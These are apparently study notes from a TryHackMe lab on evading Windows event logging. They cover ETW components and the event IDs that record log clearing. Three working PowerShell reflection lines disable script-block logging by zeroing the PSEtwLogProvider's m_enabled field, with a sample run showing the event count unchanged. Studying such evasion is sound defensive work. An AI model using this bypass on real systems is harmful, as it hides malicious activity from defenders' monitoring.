
## Introduction 

**Event Tracing for Windows** 

- Where event logs are stored and aggregated
## Event Tracing

- Event logging and trace logging are extensions of ETW 
  
  **Components**

- Controllers - build and configure sessions 
- Providers - Generate events 
- Consumers - Interpret events

## Approaches to Log Evasion 

**Event IDs for Configuring Logs (Log Smashing)** 

- 1102 - Logs when the windows security audit log was cleared 
- 104 - Logs when the log file was cleared 
- 1100 - Logs when the Windows Event Log service was shut down 

## Tracing Instrumentation 


**Event Controllers** 

- Define the size and location of a log file 
- Start and stop event tracing sessions 
- Enable providers so they can log events to the session 
- Manage the size of the buffer pool
- Obtain execution statistics for sessions

**Event Providers** 

- Collect logs from a designated source
- For example if you want to log a particular part of a system, there will be a provider for that
- Types of Providers : 
	- Managed Object Format - Defines events from the MOF classes 
	- Windows Software Trace Preprocessor - Associated with TMF files to decode information 
	- Manifest-Based - Defines events from a manifest 
	- TraceLogging - Self described events containing all required information 

**Event Consumers** 

- Consumers receive events stored in log files 
## Reflection for Fun and Silence 

- ETW Providers are loaded into a session from .NET Assembly: PSEtwLogProvider
- Assemblies are the fundamental units of a .NET Application, they can take the form of a executable or a dll. 
- On startup the user has the same security context as the assembly files, which means they can be modified. 
- Reflection is when an Assembly is investigated, specifically to look at the metadata. 
- A user can reflect the ETW provider, and switch the assembly from m_enabled to $null

**Configuring the ETW Provider**



```powershell
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
```


```powershell
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
```

Set the etwprovider to null/0 ? So that no events are created after executing this powershell script
```powershell
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```

An example of how the script would work
From the notes above, I believe this will only stop the events from being created by the user who runs the script. 
```powershell
PS C:\Users\Administrator>.\reflection.ps1
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
18
PS C:\Users\Administrator> whoami
Tryhackme\administrator
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
18
```


## Patching Tracing Functions 


Common Language Runtime - When a new process is loaded, ETW originates from here. 

- A malicious user can configure in memory functions of ETW to disable it's functionality. 
## Providers via Policy 

## Group Policy Takeover 

## Abusing Log Pipeline 

## Real World Scenario 

